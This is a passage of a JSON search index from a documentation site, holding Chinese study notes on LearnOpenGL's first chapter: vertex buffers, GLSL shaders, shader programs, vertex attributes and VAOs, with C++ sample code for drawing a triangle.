\u51fd\u6570\uff0c\u6807\u51c6\u5316\u8bbe\u5907\u5750\u6807\u4f1a\u8f6c\u6362\u4e3a\u5c4f\u5e55\u7a7a\u95f4\u5750\u6807(Screen-space Coordinates)\uff0c\u6240\u5f97\u7684\u5c4f\u5e55\u7a7a\u95f4\u5750\u6807\u53c8\u4f1a\u88ab\u53d8\u6362\u4e3a\u7247\u6bb5\u8f93\u5165\u5230\u7247\u6bb5\u7740\u8272\u5668\u4e2d\u3002</p> <p>\u6211\u4eec\u5c06\u7c7b\u4f3c\u8fd9\u6837\u7684\u9876\u70b9\u6570\u636e\u53d1\u9001\u7ed9\u6e32\u67d3\u7ba1\u7ebf\u7684\u7b2c\u4e00\u9636\u6bb5\uff0c\u9876\u70b9\u7740\u8272\u5668\u3002\u5b83\u4f1a\u5728 GPU \u4e0a\u521b\u5efa\u4e00\u4e2a\u50a8\u5b58\u9876\u70b9\u6570\u636e\u7684\u5185\u5b58(\u663e\u5b58)\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u9876\u70b9\u7f13\u51b2\u5bf9\u8c61\uff08Vertex Buffer Object\uff0cVBO\uff09\u6765\u7ba1\u7406\u8fd9\u4e2a\u5185\u5b58\u3002</p> <p>Why VBO?</p> <p>\u4f7f\u7528\u7f13\u51b2\u5bf9\u8c61\u7684\u597d\u5904\u662f\u6211\u4eec\u53ef\u4ee5\u4e00\u6b21\u6027\u53d1\u9001\u5927\u91cf\u9876\u70b9\u6570\u636e\u7ed9\u663e\u5361\uff0c\u800c\u4e0d\u662f\u6bcf\u4e2a\u9876\u70b9\u53d1\u9001\u4e00\u6b21\u3002\u5bf9\u4e8e\u63a5\u6536 CPU \u53d1\u6765\u7684\u9876\u70b9\u6570\u636e\uff0c\u9876\u70b9\u7740\u8272\u5668\u5904\u7406\u9876\u70b9\u6570\u636e\u662f\u4e00\u4e2a\u76f8\u5f53\u5feb\u7684\u8fc7\u7a0b\u3002</p> <p>\u9876\u70b9\u7f13\u51b2\u5bf9\u8c61\u662f\u6211\u4eec\u5728 OpenGL \u6559\u7a0b\u4e2d\u7b2c\u4e00\u4e2a\u9047\u5230\u7684 OpenGL \u5bf9\u8c61\uff0c\u6211\u4eec\u4f7f\u7528 <code>glGenBuffers</code> \u51fd\u6570\u6765\u751f\u6210\u4e00\u4e2a\u5e26\u6709\u7f13\u51b2 ID \u7684 VBO \u5bf9\u8c61\uff1a</p> <pre><code>unsigned int VBO;\nglGenBuffers(1, &amp;VBO);\n</code></pre> <p>OpenGL \u6709\u5f88\u591a\u7f13\u51b2\u5bf9\u8c61\u7c7b\u578b\uff0c\u9876\u70b9\u7f13\u51b2\u5bf9\u8c61\u7684\u7c7b\u578b\u4e3a <code>GL_ARRAY_BUFFER</code>\uff0c\u6211\u4eec\u4f7f\u7528 <code>glBindBuffer</code> \u51fd\u6570\u5c06\u65b0\u521b\u5efa\u7684 <code>VBO</code> \u7f13\u51b2\u7ed1\u5b9a\u5230 <code>GL_ARRAY_BUFFER</code> \u76ee\u6807\u4e0a\uff1a</p> <pre><code>glBindBuffer(GL_ARRAY_BUFFER, VBO);\n</code></pre> <p>\u6b64\u65f6\u6211\u4eec\u5df2\u7ecf\u53ef\u4ee5\u7528 <code>VBO</code> \u8fd9\u4e2a\u9876\u70b9\u7f13\u51b2\u5bf9\u8c61\u7ba1\u7406\u663e\u5b58\u4e2d\u7684\u9876\u70b9\u6570\u636e\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>glBufferData</code> \u51fd\u6570\u5c06\u4e4b\u524d\u5b9a\u4e49\u7684\u9876\u70b9\u6570\u636e\u4e2d\u590d\u5236\u5230\u7f13\u51b2\u7684\u5185\u5b58\u4e2d\uff1a</p> <pre><code>glBufferData(GL_ARRAY_BUFFER, sizeof(vertices), vertices, GL_STATIC_DRAW);\n</code></pre> <p><code>glBufferData</code> \u662f\u4e00\u4e2a\u4e13\u95e8\u7528\u6765\u5c06\u7528\u6237\u5b9a\u4e49\u7684\u6570\u636e\u590d\u5236\u5230\u5f53\u524d\u7ed1\u5b9a\u7f13\u5b58\u7684\u51fd\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u7f13\u51b2\u7c7b\u578b\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u4f20\u8f93\u6570\u636e\u5927\u5c0f\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u4e3a\u5b9e\u9645\u6570\u636e\uff0c\u7b2c\u56db\u4e2a\u53c2\u6570\u5236\u5b9a\u4e86\u663e\u5361\u5982\u4f55\u7ba1\u7406\u7ed9\u5b9a\u7684\u6570\u636e\uff1a</p> <ul> <li><code>GL_STATIC_DRAW</code>\uff1a\u6570\u636e\u4e0d\u4f1a\u6216\u51e0\u4e4e\u4e0d\u4f1a\u6539\u53d8</li> <li><code>GL_DYNAMIC_DRAW</code>\uff1a\u6570\u636e\u4f1a\u6539\u53d8\u5f88\u591a</li> <li><code>GL_STREAM_DRAW</code>\uff1a\u6570\u636e\u6bcf\u6b21\u7ed8\u5236\u65f6\u90fd\u4f1a\u6539\u53d8</li> </ul> <p>\u5bf9\u4e8e\u6211\u4eec\u8981\u753b\u7684\u4e00\u4e2a\u7b80\u5355\u4e09\u89d2\u5f62\uff0c\u6bcf\u6b21\u8c03\u7528\u6e32\u67d3\u65f6\u4e09\u89d2\u5f62\u4f4d\u7f6e\u90fd\u4fdd\u6301\u539f\u6837\uff0c\u56e0\u6b64\u4f7f\u7528 <code>GL_STATIC_DRAW</code> \u5373\u53ef\u3002</p>"},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#_2","title":"\u9876\u70b9\u7740\u8272\u5668","text":"<p>\u4e0b\u9762\u6211\u4eec\u5c06\u521b\u5efa\u4e00\u4e2a\u9876\u70b9\u7740\u8272\u5668\u548c\u7247\u6bb5\u7740\u8272\u5668\u6765\u771f\u6b63\u5904\u7406\u8fd9\u4e9b\u6570\u636e\u3002</p> <p>\u9876\u70b9\u7740\u8272\u5668(Vertex Shader)\u662f\u51e0\u4e2a\u53ef\u7f16\u7a0b\u7740\u8272\u5668\u4e2d\u7684\u4e00\u4e2a\u3002\u5982\u679c\u6211\u4eec\u6253\u7b97\u505a\u6e32\u67d3\u7684\u8bdd\uff0c\u73b0\u4ee3OpenGL\u9700\u8981\u6211\u4eec\u81f3\u5c11\u8bbe\u7f6e\u4e00\u4e2a\u9876\u70b9\u548c\u4e00\u4e2a\u7247\u6bb5\u7740\u8272\u5668\u3002</p> <p>\u6211\u4eec\u9700\u8981\u505a\u7684\u7b2c\u4e00\u4ef6\u4e8b\u662f\u7528\u7740\u8272\u5668\u8bed\u8a00GLSL(OpenGL Shading Language)\u7f16\u5199\u9876\u70b9\u7740\u8272\u5668\uff0c\u7136\u540e\u7f16\u8bd1\u8fd9\u4e2a\u7740\u8272\u5668\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u5b83\u4e86\u3002\u4ee5\u4e0b\u4e3a\u4e00\u4e2a\u975e\u5e38\u57fa\u7840\u7684GLSL\u9876\u70b9\u7740\u8272\u5668\u7684\u6e90\u4ee3\u7801\uff1a</p> <pre><code>// \u7248\u672c\u58f0\u660e\uff1aOpenGL 3.3\uff0c\u6838\u5fc3\u6a21\u5f0f\n#version 330 core\nlayout (location = 0) in vec3 aPos;\n\nvoid main()\n{\n    gl_Position = vec4(aPos.x, aPos.y, aPos.z, 1.0);\n}\n</code></pre> <p>\u4e3a\u4e86\u7f16\u8bd1\u7740\u8272\u5668\uff0c\u6211\u4eec\u9700\u8981\u5c06\u7740\u8272\u5668\u6e90\u4ee3\u7801\u5b58\u50a8\u5728C\u98ce\u683c\u5b57\u7b26\u4e32\u4e2d\uff0c\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u52a8\u6001\u7f16\u8bd1\u5b83\uff1a</p> <pre><code>int main()\n{\n    // \u521d\u59cb\u5316GLFW\n    if (!glfwInit())\n    {\n        std::cout &lt;&lt; \"Failed to initialize GLFW\" &lt;&lt; std::endl;\n        return -1;\n    }\n\n    // \u521b\u5efa\u4e00\u4e2a\u7a97\u53e3\n    GLFWwindow* window = glfwCreateWindow(800, 600, \"LearnOpenGL\", NULL, NULL);\n    if (!window)\n    {\n        std::cout &lt;&lt; \"Failed to create GLFW window\" &lt;&lt; std::endl;\n        glfwTerminate();\n        return -1;\n    }\n    glfwMakeContextCurrent(window);\n\n    // \u521d\u59cb\u5316GLAD\n    if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress))\n    {\n        std::cout &lt;&lt; \"Failed to initialize GLAD\" &lt;&lt; std::endl;\n        return -1;\n    }\n\n    // \u9876\u70b9\u7740\u8272\u5668\u6e90\u4ee3\u7801\n    const char* vertexShaderSource = \"#version 330 core\\n\"\n        \"layout (location = 0) in vec3 aPos;\\n\"\n        \"void main()\\n\"\n        \"{\\n\"\n        \"   gl_Position = vec4(aPos.x, aPos.y, aPos.z, 1.0);\\n\"\n        \"}\\0\";\n\n    unsigned int vertexShader; // \u7740\u8272\u5668\u5bf9\u8c61\u901a\u8fc7 ID \u6765\u5f15\u7528\uff0c\u56e0\u6b64\u5b9a\u4e49\u4e3a unsigned int\n    vertexShader = glCreateShader(GL_VERTEX_SHADER); // \u521b\u5efa\u4e00\u4e2a\u9876\u70b9\u7740\u8272\u5668\u5bf9\u8c61\n\n    glShaderSource(vertexShader, 1, &amp;vertexShaderSource, NULL); // \u628a\u7740\u8272\u5668\u6e90\u7801\u9644\u52a0\u5230\u7740\u8272\u5668\u5bf9\u8c61\u4e0a\n    glCompileShader(vertexShader); // \u7f16\u8bd1\u7740\u8272\u5668\n\n    int success;       // \u662f\u5426\u7f16\u8bd1\u6210\u529f\n    char infoLog[512]; // \u62a5\u9519\u4fe1\u606f\n\n    glGetShaderiv(vertexShader, GL_COMPILE_STATUS, &amp;success); // \u68c0\u67e5\u662f\u5426\u7f16\u8bd1\u6210\u529f\n    if (!success)\n    {\n        glGetShaderInfoLog(vertexShader, 512, NULL, infoLog); // \u83b7\u53d6\u9519\u8bef\u4fe1\u606f\n        std::cout &lt;&lt; \"ERROR::SHADER::VERTEX::COMPILATION_FAILED\\n\" &lt;&lt; infoLog &lt;&lt; std::endl;\n    }\n    else\n        std::cout &lt;&lt; \"Vertex shader compiled successfully\" &lt;&lt; std::endl;\n\n    // \u6e05\u7406\u5e76\u9000\u51fa\n    glfwDestroyWindow(window);\n    glfwTerminate();\n    return 0;\n}\n</code></pre> <p>\u7740\u8272\u5668\u7f16\u8bd1\u8981\u5728 GLFW \u548c GLAD \u90fd\u521d\u59cb\u5316\u5b8c\u7684\u57fa\u7840\u4e0a</p>"},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#_3","title":"\u7247\u6bb5\u7740\u8272\u5668","text":"<p>\u7247\u6bb5\u7740\u8272\u5668\u7528\u4e8e\u8ba1\u7b97\u50cf\u7d20\u7684\u989c\u8272\u5e76\u8f93\u51fa\u3002\u5728\u8ba1\u7b97\u673a\u56fe\u5f62\u4e2d\uff0c\u989c\u8272\u53ef\u88ab\u8868\u793a\u4e3a\u56db\u5143\u5411\u91cf\uff0c\u5305\u62ec\u7ea2\u8272\u3001\u7eff\u8272\u3001\u84dd\u8272\u3001\u900f\u660e\u5ea6\u5206\u91cf\uff0c\u901a\u5e38\u7f29\u5199\u4e3a RGBA\u3002\u5728 OpenGL \u6216 GLSL \u4e2d\uff0c\u6bcf\u4e2a\u5206\u91cf\u7684\u5f3a\u5ea6\u4ecb\u4e8e 0.0 \u5230 1.0 \u4e4b\u95f4\u3002</p> <p>\u4ee5\u4e0b\u662f\u4e00\u4e2a\u4e00\u76f4\u8f93\u51fa\u5b8c\u5168\u4e0d\u900f\u660e\u6a58\u9ec4\u8272\u7684\u7b80\u5355\u7247\u6bb5\u7740\u8272\u5668\uff1a</p> <pre><code>#version 330 core\nout vec4 FragColor;\n\nvoid main()\n{\n    FragColor = vec4(1.0f, 0.5f, 0.2f, 1.0f);\n} \n</code></pre> <p>\u5176\u7f16\u8bd1\u8fc7\u7a0b\u548c\u9876\u70b9\u7740\u8272\u5668\u6b65\u9aa4\u76f8\u540c\uff0c\u6b64\u5904\u4e0d\u518d\u5c55\u793a\u3002</p> <pre><code>// \u53ef\u80fd\u7528\u5230\u7684\u51fd\u6570\nconst char* fragmentShaderSource = \"#version 330 core\\n\"\n\"out vec4 FragColor;\\n\"\n\"void main()\\n\"\n\"{\\n\"\n\"   FragColor = vec4(1.0f, 0.5f, 0.2f, 1.0f);\\n\"\n\"}\\0\";\n\nunsigned int fragmentShader;\nfragmentShader = glCreateShader(GL_FRAGMENT_SHADER);\nglShaderSource(fragmentShader, 1, &amp;fragmentShaderSource, NULL);\nglCompileShader(fragmentShader);\n</code></pre> <p>\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u5728\u7247\u6bb5\u7740\u8272\u5668\u4e2d\u5b9a\u4e49\u4e00\u4e2a <code>uniform</code> \u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u5b83\u662f\u4e00\u4e2a\u72ec\u4e00\u65e0\u4e8c\u7684\u5168\u5c40\u53d8\u91cf\uff0c\u53ef\u4ee5\u88ab\u4efb\u610f\u7740\u8272\u5668\u4efb\u610f\u9636\u6bb5\u8bbf\u95ee\u3002</p> <p>\u6211\u4eec\u4f7f\u7528 <code>uniform</code> \u6765\u5b9e\u73b0\u6e10\u53d8\u989c\u8272\u6548\u679c\uff1a</p> <pre><code>// \u7247\u6bb5\u7740\u8272\u5668\u6e90\u4ee3\u7801\nconst char* fragmentShaderSource = \"#version 330 core\\n\"\n\"uniform vec4 ourColor;\"\n\"out vec4 FragColor;\\n\"\n\"void main()\\n\"\n\"{\\n\"\n\"   FragColor = ourColor;\\n\"\n\"}\\0\";\n\n/* \u6e32\u67d3\u6307\u4ee4\uff0c\u4f4d\u4e8e render loop \u4e2d */\ndouble timeValue = glfwGetTime();\nGLfloat redValue = (sin(timeValue) / 2) + 0.5;\nGLfloat greenValue = (sin(timeValue + 2.0f) / 2) + 0.5;\nGLfloat blueValue = (sin(timeValue + 4.0f) / 2) + 0.5;\nGLint vertexColorLocation = glGetUniformLocation(shaderProgram, \"ourColor\");\n\nglUseProgram(shaderProgram);\n\nglUniform4f(vertexColorLocation, redValue, greenValue, blueValue, 1.0f);\n\nglBindVertexArray(VAO);\nglDrawElements(GL_TRIANGLES, 6, GL_UNSIGNED_INT, 0);\n</code></pre>"},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#_4","title":"\u7740\u8272\u5668\u7a0b\u5e8f\u5bf9\u8c61","text":"<p>\u5728\u7f16\u8bd1\u5b8c\u4e0a\u8ff0\u4e24\u4e2a\u7740\u8272\u5668\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u4e00\u4e2a\u7740\u8272\u5668\u7a0b\u5e8f\u5bf9\u8c61\u5c06\u4e24\u4e2a\u7740\u8272\u5668\u5bf9\u8c61\u94fe\u63a5\u5230\u4e00\u8d77\u3002</p> <p>\u7740\u8272\u5668\u7a0b\u5e8f\u5bf9\u8c61\uff08Shader Program Object\uff09\u662f\u591a\u4e2a\u7740\u8272\u5668\u5408\u5e76\u4e4b\u540e\u5e76\u6700\u7ec8\u94fe\u63a5\u5b8c\u6210\u7684\u7248\u672c\u3002\u5df2\u6fc0\u6d3b\u7740\u8272\u5668\u7a0b\u5e8f\u7684\u7740\u8272\u5668\u5c06\u5728\u6211\u4eec\u53d1\u8d77\u6e32\u67d3\u8c03\u7528\u7684\u65f6\u5019\u88ab\u4f7f\u7528\u3002</p> <p>\u6211\u4eec\u4f7f\u7528 <code>glCreateProgram</code> \u51fd\u6570\u6765\u521b\u5efa\u4e00\u4e2a\u7740\u8272\u5668\u7a0b\u5e8f\u5bf9\u8c61\uff0c\u5e76\u8fd4\u56de\u5176 ID \u5f15\u7528\uff0c\u7136\u540e\u5c06\u7740\u8272\u5668\u9644\u52a0\u5230\u7a0b\u5e8f\u5bf9\u8c61\u4e0a\u5e76\u94fe\u63a5\uff1a</p> <pre><code>unsigned int shaderProgram;\nshaderProgram = glCreateProgram();\n\nglAttachShader(shaderProgram, vertexShader);\nglAttachShader(shaderProgram, fragmentShader);\nglLinkProgram(shaderProgram);\n\nglUseProgram(shaderProgram);\n\nglDeleteShader(vertexShader);\nglDeleteShader(fragmentShader);\n</code></pre> <p>\u7c7b\u4f3c\u7740\u8272\u5668\u7f16\u8bd1\uff0c\u540c\u6837\u53ef\u4ee5\u68c0\u6d4b\u94fe\u63a5\u64cd\u4f5c\u662f\u5426\u5931\u8d25</p> <pre><code>glGetProgramiv(shaderProgram, GL_LINK_STATUS, &amp;success);\nif(!success) {\n    glGetProgramInfoLog(shaderProgram, 512, NULL, infoLog);\n    ...\n}\n</code></pre> <p>\u4f7f\u7528 <code>glUseProgram</code> \u51fd\u6570\u6765\u6fc0\u6d3b\u7a0b\u5e8f\u5bf9\u8c61\uff0c\u6b64\u540e\u6bcf\u4e2a\u7740\u8272\u5668\u8c03\u7528\u548c\u6e32\u67d3\u8c03\u7528\u90fd\u4f1a\u4f7f\u7528\u8fd9\u4e2a\u7a0b\u5e8f\u5bf9\u8c61\u3002\u628a\u7740\u8272\u5668\u5bf9\u8c61\u94fe\u63a5\u5230\u7a0b\u5e8f\u5bf9\u8c61\u540e\uff0c\u5c31\u53ef\u4ee5\u5220\u9664\u7740\u8272\u5668\u5bf9\u8c61\u4e86\u3002</p>"},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#_5","title":"\u94fe\u63a5\u9876\u70b9\u5c5e\u6027","text":"<p>\u9876\u70b9\u7740\u8272\u5668\u5141\u8bb8\u6211\u4eec\u6307\u5b9a\u8f93\u5165\u7684\u9876\u70b9\u683c\u5f0f\uff0c\u8fd9\u5177\u6709\u975e\u5e38\u5f3a\u7684\u7075\u6d3b\u6027\u3002\u4f46\u662f\uff0c\u8fd9\u4e5f\u610f\u5473\u7740\u6211\u4eec\u9700\u8981\u624b\u52a8\u6307\u5b9a\u8f93\u5165\u6570\u636e\u7684\u54ea\u4e00\u90e8\u5206\u5bf9\u5e94\u7740\u8272\u5668\u54ea\u4e2a\u9876\u70b9\u5c5e\u6027\u3002\u5047\u5b9a\u4e00\u4e2a\u9876\u70b9\u7f13\u51b2\u6570\u636e\u7684\u7ed3\u6784\u5982\u4e0b\uff1a</p> <p></p> <ul> <li>\u6bcf\u4e2a\u4f4d\u7f6e\u6570\u636e\u4e3a 4 \u5b57\u8282\u5927\u5c0f\u7684\u6d6e\u70b9\u503c</li> <li>\u6bcf\u4e2a Vertex \u5305\u542b\u4e09\u4e2a\u4f4d\u7f6e\u6570\u636e</li> <li>\u5728\u8fd9\u4e09\u4e2a\u503c\u4e2d\u6ca1\u6709\u7a7a\u9699\uff0c\u5373\u5b83\u4eec\u5728\u6570\u7ec4\u4e2d\u7d27\u5bc6\u6392\u5217\u3002</li> <li>\u6570\u636e\u4e2d\u7b2c\u4e00\u4e2a\u503c\u4f4d\u4e8e\u7f13\u51b2\u5f00\u59cb\u7684\u4f4d\u7f6e</li> </ul> <p>\u6839\u636e\u4ee5\u4e0a\u8fd9\u4e9b\u4fe1\u606f\uff0c\u6211\u4eec\u901a\u8fc7 <code>glVertexAttribPointer</code> \u51fd\u6570\u6765\u544a\u8bc9 OpenGL \u5982\u4f55\u89e3\u6790\u8be5\u9876\u70b9\u6570\u636e\uff1a</p> <pre><code>glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(float), (void*)0);\nglEnableVertexAttribArray(0);\n</code></pre> <ul> <li>\u53c2\u6570\u4e00\uff1a \u9876\u70b9\u5c5e\u6027\uff0c\u5bf9\u5e94\u9876\u70b9\u7740\u8272\u5668\u4e2d\u7684 <code>layout(location=0)</code></li> <li>\u53c2\u6570\u4e8c\uff1a \u9876\u70b9\u5c5e\u6027\u7684\u5927\u5c0f(\u4e2a\u6570\uff1f)\uff0c\u9876\u70b9\u5c5e\u6027\u662f\u4e00\u4e2a <code>vec3</code>\uff0c\u7531\u4e09\u4e2a\u503c\u7ec4\u6210\uff0c\u56e0\u6b64\u8bbe\u7f6e\u4e3a 3</li> <li>\u53c2\u6570\u4e09\uff1a \u6570\u636e\u7c7b\u578b\uff0c\u8bbe\u7f6e\u4e3a\u6d6e\u70b9\u503c</li> <li>\u53c2\u6570\u56db\uff1a \u662f\u5426\u5e0c\u671b\u6570\u636e\u88ab\u6807\u51c6\u5316\u3002\u8bbe\u7f6e <code>GL_FALSE</code> \u5219\u4e0d\u4fee\u6539\u6570\u636e\uff0c\u5982\u679c\u4e3a <code>GL_TRUE</code>\uff1a<ul> <li>\u5bf9\u4e8e\u65e0\u7b26\u53f7\u6570\uff0c\u6570\u636e\u88ab\u6620\u5c04\u5230 <code>[0,1]</code> \u4e4b\u95f4</li> <li>\u5bf9\u4e8e\u6709\u7b26\u53f7\u6570\uff0c\u6570\u636e\u88ab\u6620\u5c04\u5230 <code>[-1,1]</code> \u4e4b\u95f4</li> </ul> </li> <li>\u53c2\u6570\u4e94\uff1a \u6b65\u957f\uff0c\u4e24\u7ec4\u9876\u70b9\u5c5e\u6027\u8d77\u59cb\u4f4d\u7f6e\u7684\u95f4\u9694\uff0c\u672c\u4f8b\u4e2d\u5dee\u503c\u4e3a 3 \u4e2a float \u5927\u5c0f<ul> <li>\u5bf9\u4e8e\u7d27\u5bc6\u6392\u5217\u7684\u9876\u70b9\u5c5e\u6027\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e3a 0 \u6765\u8ba9 OpenGL \u6765\u51b3\u5b9a\u5177\u4f53\u6b65\u957f</li> </ul> </li> <li>\u53c2\u6570\u516d\uff1a \u6570\u636e\u5728\u7f13\u51b2\u8d77\u59cb\u4f4d\u7f6e\u7684\u504f\u79fb\uff0c\u9700\u8981\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u4e3a <code>void*</code></li> </ul> <p>\u4f7f\u7528 <code>glEnableVertexAttribArray</code> \u51fd\u6570\u6765\u542f\u7528\u9876\u70b9\u5c5e\u6027\uff0c\u5176\u53c2\u6570\u4e3a\u9876\u70b9\u5c5e\u6027\u4f4d\u7f6e\u503c\uff08\u4e0a\u9762\u7684\u53c2\u6570\u4e00\uff09\u3002\u81f3\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u5982\u4e0b\u7b80\u5316\u6b65\u9aa4\u6765\u7ed8\u5236\u4e00\u4e2a\u7269\u4f53\uff1a</p> <pre><code>// 0. \u590d\u5236\u9876\u70b9\u6570\u7ec4\u5230\u7f13\u51b2\u4e2d\u4f9bOpenGL\u4f7f\u7528\nglBindBuffer(GL_ARRAY_BUFFER, VBO);\nglBufferData(GL_ARRAY_BUFFER, sizeof(vertices), vertices, GL_STATIC_DRAW);\n// 1. \u8bbe\u7f6e\u9876\u70b9\u5c5e\u6027\u6307\u9488\nglVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(float), (void*)0);\nglEnableVertexAttribArray(0);\n// 2. \u5f53\u6211\u4eec\u6e32\u67d3\u4e00\u4e2a\u7269\u4f53\u65f6\u8981\u4f7f\u7528\u7740\u8272\u5668\u7a0b\u5e8f\nglUseProgram(shaderProgram);\n// 3. \u7ed8\u5236\u7269\u4f53\nsomeOpenGLFunctionThatDrawsOurTriangle();\n</code></pre> <p>\u4f46\u662f\u7ed8\u5236\u6bcf\u4e00\u4e2a\u7269\u4f53\u90fd\u9700\u8981\u91cd\u590d\u4e0a\u8ff0\u6b65\u9aa4\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u6bcf\u4e2a\u7269\u4f53\u5404\u81ea\u914d\u7f6e\u6240\u6709\u9876\u70b9\u5c5e\u6027\uff0c\u8fd9\u663e\u7136\u662f\u4e0d\u53ef\u53d6\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u8fd9\u4e9b\u72b6\u6001\u914d\u7f6e\u5b58\u50a8\u5728\u4e00\u4e2a\u5bf9\u8c61\u4e2d\uff0c\u5e76\u4e14\u901a\u8fc7\u7ed1\u5b9a\u8fd9\u4e2a\u5bf9\u8c61\u6765\u6062\u590d\u72b6\u6001\uff0c\u8fd9\u5c31\u662f\u9876\u70b9\u6570\u7ec4\u5bf9\u8c61\uff08Vertex Array Object\uff0cVAO\uff09</p> <p>OpenGL \u7684\u6838\u5fc3\u6a21\u5f0f\u8981\u6c42\u6211\u4eec\u4f7f\u7528 VAO</p> <p>\u9876\u70b9\u6570\u7ec4\u5bf9\u8c61\u53ef\u4ee5\u50cf\u9876\u70b9\u7f13\u51b2\u5bf9\u8c61\u4e00\u6837\u88ab\u7ed1\u5b9a\uff0c\u968f\u540e\u4efb\u4f55\u9876\u70b9\u5c5e\u6027\u8c03\u7528\u90fd\u4f1a\u5b58\u50a8\u5728 VAO \u4e2d\u3002\u8fd9\u6837\u7684\u597d\u5904\u5728\u4e8e\uff0c\u5f53\u914d\u7f6e\u9876\u70b9\u5c5e\u6027\u6307\u9488\u65f6\uff0c\u53ea\u9700\u8981\u5c06\u8c03\u7528\u6267\u884c\u4e00\u6b21\uff0c\u4e4b\u540e\u518d\u7ed8\u5236\u7269\u4f53\u65f6\u53ea\u9700\u8981\u7ed1\u5b9a\u76f8\u5e94 VAO \u5373\u53ef\u3002</p> <p>\u4e00\u4e2a VAO \u4f1a\u5b58\u50a8\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> <ul> <li><code>glEnableVertexAttribArray</code> \u548c <code>glDisableVertexAttribArray</code> \u7684\u8c03\u7528</li> <li>\u901a\u8fc7 <code>glVertexAttribPointer</code> \u8bbe\u7f6e\u7684\u9876\u70b9\u5c5e\u6027\u914d\u7f6e</li> <li>\u901a\u8fc7 <code>glVertexAttribPointer</code> \u8c03\u7528\u4e0e\u9876\u70b9\u5c5e\u6027\u76f8\u5173\u8054\u7684\u9876\u70b9\u7f13\u51b2\u5bf9\u8c61</li> </ul> <p>\u4f7f\u7528 VAO \u7684\u7ed8\u5236\u6b65\u9aa4\u53ef\u4ee5\u7b80\u5316\u5982\u4e0b\uff1a</p> <pre><code>// ..:: \u521d\u59cb\u5316\u4ee3\u7801\uff08\u53ea\u8fd0\u884c\u4e00\u6b21 (\u9664\u975e\u4f60\u7684\u7269\u4f53\u9891\u7e41\u6539\u53d8)\uff09 :: ..\n// 1. \u521d\u59cb\u5316 &amp; \u7ed1\u5b9aVAO\nunsigned int VAO;\nglGenVertexArrays(1, &amp;VAO);\nglBindVertexArray(VAO);\n// 2. \u628a\u9876\u70b9\u6570\u7ec4\u590d\u5236\u5230\u7f13\u51b2\u4e2d\u4f9bOpenGL\u4f7f\u7528\nglBindBuffer(GL_ARRAY_BUFFER, VBO);\nglBufferData(GL_ARRAY_BUFFER, sizeof(vertices), vertices, GL_STATIC_DRAW);\n// 3. \u8bbe\u7f6e\u9876\u70b9\u5c5e\u6027\u6307\u9488\nglVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(float), (void*)0);\nglEnableVertexAttribArray(0);\n\n[...]\n\n// ..:: \u7ed8\u5236\u4ee3\u7801\uff08\u6e32\u67d3\u5faa\u73af\u4e2d\uff09 :: ..\n// 4. \u7ed8\u5236\u7269\u4f53\nglUseProgram(shaderProgram);\nglBindVertexArray(VAO);\nsomeOpenGLFunctionThatDrawsOurTriangle();\n</code></pre> <p>\u7ec8\u4e8e\u80fd\u753b\u51fa\u4e00\u4e2a\u4e09\u89d2\u5f62\u5566\uff01</p> <pre><code>#include &lt;glad/glad.h&gt;\n#include &lt;GLFW/glfw3.h&gt;\n#include &lt;iostream&gt;\n\n/*\n* glad\u5934\u6587\u4ef6\u5305\u542b\u4e86\u6b63\u786e\u7684OpenGL\u5934\u6587\u4ef6\uff0c\u4f8b\u5982GL/gl.h\uff0c\u6240\u4ee5GLFW\u5e93\u5e94\u8be5\u5728glad.h\u4e4b\u540e\u88ab\u5305\u542b\n*/\n\n// \u9876\u70b9\u7740\u8272\u5668\u6e90\u4ee3\u7801\nconst char* vertexShaderSource = \"#version 330 core\\n\"\n\"layout (location = 0) in vec3 aPos;\\n\"\n\"void main()\\n\"\n\"{\\n\"\n\"   gl_Position = vec4(aPos.x, aPos.y, aPos.z, 1.0);\\n\"\n\"}\\0\";\n\n// \u7247\u6bb5\u7740\u8272\u5668\u6e90\u4ee3\u7801\nconst char* fragmentShaderSource = \"#version 330 core\\n\"\n\"out vec4 FragColor;\\n\"\n\"void main()\\n\"\n\"{\\n\"\n\"   FragColor = vec4(1.0f, 0.5f, 0.2f, 1.0f);\\n\"\n\"}\\0\";\n\n// \u4e09\u89d2\u5f62\u9876\u70b9\u6570\u636e\nconst float vertices[] =\n{\n-0.5f, -0.5f, 0.0f,\n 0.5f, -0.5f, 0.0f,\n 0.0f,  0.5f, 0.0f\n};\n\n// \u7a97\u53e3\u5927\u5c0f\u6539\u53d8\u65f6\u7684\u56de\u8c03\u51fd\u6570\nvoid framebuffer_size_callback(GLFWwindow* window, int width, int height)\n{\n    glViewport(0, 0, width, height); // \u8bbe\u7f6e\u89c6\u53e3\u5927\u5c0f\n}\n\n// \u5904\u7406\u8f93\u5165\nvoid processInput(GLFWwindow* window)\n{\n    if (glfwGetKey(window, GLFW_KEY_ESCAPE) == GLFW_PRESS) // \u6309\u4e0b ESC \u952e\n        glfwSetWindowShouldClose(window, true);            // 